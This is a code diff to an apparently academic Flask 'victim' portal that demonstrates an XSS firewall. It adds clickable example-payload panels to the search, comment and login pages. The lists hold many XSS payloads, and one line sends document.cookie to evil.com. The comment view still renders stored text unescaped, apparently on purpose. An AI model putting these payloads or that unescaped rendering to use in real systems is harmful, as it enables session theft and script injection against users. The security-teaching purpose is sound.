@@ -11,6 +11,7 @@ Routes:
     /victim/login     → Login page
 """
 
+import html as _html
 from flask import Blueprint, request
 from firewall_service import detect_xss
 from datetime import datetime
@@ -87,6 +88,12 @@ button[type=submit]:hover{background:#34495e}
 .tile .lbl{margin-top:8px;font-weight:bold;color:white}
 .tile .sub{font-size:12px;opacity:.8;margin-top:4px;color:white}
 .payloads{font-family:monospace;font-size:13px;color:#c0392b;line-height:2.2;background:#fff5f5;padding:15px;border-radius:6px;margin-top:10px}
+.payload-hint{margin-top:14px;padding:14px;background:#fff8f3;border:1px dashed #f39c12;border-radius:8px}
+.payload-hint .head{font-size:13px;color:#7f4f00;margin-bottom:8px;font-weight:bold}
+.payload-item{cursor:pointer;padding:6px 12px;margin:4px 0;border-radius:5px;background:white;border:1px solid #f0c0c0;display:flex;align-items:center;gap:8px;transition:all .15s ease}
+.payload-item:hover{background:#ffe5e5;border-color:#e74c3c;transform:translateX(3px)}
+.payload-item code{font-size:12px;color:#c0392b;white-space:pre-wrap;word-break:break-all;flex:1}
+.payload-item .tag{font-size:10px;text-transform:uppercase;background:#e74c3c;color:white;padding:2px 6px;border-radius:3px;letter-spacing:.5px}
 @keyframes pulse{from{box-shadow:0 0 10px rgba(231,76,60,.4)}to{box-shadow:0 0 28px rgba(231,76,60,.9)}}
 </style>"""
 
@@ -115,10 +122,69 @@ THESIS_FOOTER = """
   Supervised By: <strong style="color:white">Prof. Dr. Ziyad Tariq Mustafa Al-Ta'i</strong></div>
 </footer>"""
 
+_FILL_FIELD_JS = """
+<script>
+function fillField(id, el) {
+  const input = document.getElementById(id);
+  if (!input) return;
+  input.value = el.dataset.payload;
+  input.focus();
+  // Brief flash so the user sees the input was populated
+  input.style.background = '#fff5cc';
+  setTimeout(() => { input.style.background = ''; }, 600);
+}
+</script>"""
+
+
+PAYLOADS_REFLECTED = [
+    ("Basic script tag",       "<script>alert('Reflected XSS')</script>"),
+    ("IMG onerror",            "<img src=x onerror=alert('Reflected')>"),
+    ("SVG onload",             "<svg onload=alert(1)>"),
+    ("JavaScript URI",         "<a href=\"javascript:alert(1)\">click</a>"),
+    ("URL-encoded payload",    "%3Cscript%3Ealert(1)%3C/script%3E"),
+    ("Attribute breakout",     "\"><script>alert(1)</script>"),
+]
+
+PAYLOADS_STORED = [
+    ("Persistent script",      "<script>alert('Stored XSS persists for every visitor!')</script>"),
+    ("Cookie exfiltration",    "<script>fetch('https://evil.com/?c='+document.cookie)</script>"),
+    ("IMG payload (no <script>)", "<img src=x onerror=alert('Stored attack')>"),
+    ("Iframe javascript: URI", "<iframe src=\"javascript:alert(1)\"></iframe>"),
+    ("Autofocus event handler","<input onfocus=alert('stored') autofocus>"),
+    ("SVG with onload",        "<svg/onload=alert('stored payload')>"),
+]
+
+PAYLOADS_LOGIN = [
+    ("Script in username",     "<script>alert('Login XSS')</script>"),
+    ("Cookie steal",           "<script>alert(document.cookie)</script>"),
+    ("IMG onerror in field",   "<img src=x onerror=alert('login')>"),
+    ("Attribute-break attempt","admin\"><script>alert(1)</script>"),
+    ("Event handler injection","\" onmouseover=alert(1) x=\""),
+    ("SQL+XSS combo",          "admin'-- <script>alert(1)</script>"),
+]
+
+
+def render_payload_panel(payloads, target_id, context_label):
+    """Build a clickable example-payloads panel for a given input id and context label."""
+    items_html = ''.join(
+        f'<div class="payload-item" data-payload="{_html.escape(payload, quote=True)}" '
+        f'onclick="fillField(\'{target_id}\', this)" title="Click to fill the input">'
+        f'  <span class="tag">{_html.escape(label)}</span>'
+        f'  <code>{_html.escape(payload)}</code>'
+        f'</div>'
+        for label, payload in payloads
+    )
+    return f"""
+<div class="payload-hint">
+  <div class="head">💡 Example {context_label} payloads &middot; click any to fill the field</div>
+  {items_html}
+</div>"""
+
+
 def page(title, body):
     return f"""<!DOCTYPE html>
 <html><head><meta charset="utf-8"><title>{title} — TestPortal</title>{STYLE}</head>
-<body>{nav()}<div class="container">{body}</div>{THESIS_FOOTER}</body></html>"""
+<body>{nav()}<div class="container">{body}</div>{THESIS_FOOTER}{_FILL_FIELD_JS}</body></html>"""
 
 
 def blocked_html(detection, input_text):
@@ -199,15 +265,18 @@ def search():
                     + ''.join(f'<div class="result" style="margin-top:10px">{r}</div>' for r in results)
                 )
 
+    payloads_panel = render_payload_panel(PAYLOADS_REFLECTED, 'queryInput', 'reflected-context')
+
     body = f"""
 <div class="card">
-  <h2>🔍 Search Articles</h2>
+  <h2>🔍 Search Articles <span style="font-size:12px;font-weight:normal;color:#888">— reflected-context demo</span></h2>
   <form method="POST">
-    <input type="text" name="query"
-           placeholder="Search... (try: &lt;script&gt;alert('XSS')&lt;/script&gt;)"
-           value="{query}" autofocus>
+    <input type="text" name="query" id="queryInput"
+           placeholder="Search... or click an example payload below"
+           value="{_html.escape(query, quote=True)}" autofocus>
     <button type="submit">Search</button>
   </form>
+  {payloads_panel}
   {result_html}
 </div>"""
     return page('Search', body)
@@ -251,16 +320,19 @@ def comments():
   <div class="body">{c['text']}</div>
 </div>""" for c in comments_store) or '<p style="color:#aaa;padding:10px 0">No comments yet — be the first!</p>'
 
+    payloads_panel = render_payload_panel(PAYLOADS_STORED, 'commentInput', 'stored-context')
+
     body = f"""
 <div class="card">
-  <h2>💬 Post a Comment</h2>
+  <h2>💬 Post a Comment <span style="font-size:12px;font-weight:normal;color:#888">— stored-context demo</span></h2>
   <form method="POST">
-    <input type="text" name="name"
-           placeholder="Your name  (try XSS payload here!)">
-    <textarea name="comment"
-              placeholder="Your comment  (try XSS payload here too!)"></textarea>
+    <input type="text" name="name" id="nameInput"
+           placeholder="Your name">
+    <textarea name="comment" id="commentInput"
+              placeholder="Your comment — or click an example payload below"></textarea>
     <button type="submit">Post Comment</button>
   </form>
+  {payloads_panel}
   {alert_html}
 </div>
 <div class="card">
@@ -293,17 +365,20 @@ def login():
         elif username:
             alert_html = f'<div class="safe">✅ Safe login attempt — Welcome, <b>{username}</b>!</div>'
 
+    payloads_panel = render_payload_panel(PAYLOADS_LOGIN, 'usernameInput', 'auth-form-context')
+
     body = f"""
-<div class="card" style="max-width:460px;margin:0 auto">
-  <h2>🔐 Login</h2>
+<div class="card" style="max-width:560px;margin:0 auto">
+  <h2>🔐 Login <span style="font-size:12px;font-weight:normal;color:#888">— auth-form-context demo</span></h2>
   <p style="color:#777;margin-bottom:20px;font-size:13px">
-    Try injecting XSS in the username or password fields!
+    Click an example payload below to fill the username field, then press Login.
   </p>
   <form method="POST">
-    <input type="text"     name="username" placeholder="Username  (try XSS payload!)">
-    <input type="password" name="password" placeholder="Password  (try XSS payload!)">
+    <input type="text"     name="username" id="usernameInput" placeholder="Username">
+    <input type="password" name="password" id="passwordInput" placeholder="Password">
     <button type="submit" style="width:100%">Login</button>
   </form>
+  {payloads_panel}
   {alert_html}
 </div>"""
     return page('Login', body)
